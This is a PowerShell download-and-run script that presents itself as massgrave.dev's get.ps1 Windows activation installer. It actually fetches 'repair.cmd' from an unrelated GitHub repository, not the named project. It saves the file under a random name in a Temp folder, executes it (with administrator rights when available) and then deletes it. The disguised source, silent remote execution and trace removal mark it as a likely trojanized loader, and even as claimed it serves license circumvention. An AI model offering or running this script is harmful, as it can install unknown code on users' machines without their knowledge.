# The following get.ps1 code is hosted on get.activated.win for massgrave.dev. For more info, please visit massgrave.dev.

$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients for current session
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

$DownloadURL1 = 'https://github.com/naviyanka/ProjectTS/raw/main/repair.cmd'
$DownloadURL2 = 'https://github.com/naviyanka/ProjectTS/raw/main/repair.cmd'

$URLs = @($DownloadURL1, $DownloadURL2)
$RandomURL1 = Get-Random -InputObject $URLs
$RandomURL2 = $URLs -ne $RandomURL1

try {
    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
}
catch {
	$response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
}

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\repair_$rand.cmd" } else { "$env:TEMP\repair_$rand.cmd" }

$ScriptArgs = "$args "
$prefix = "@::: $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\repair*.cmd", "$env:SystemRoot\Temp\repair*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
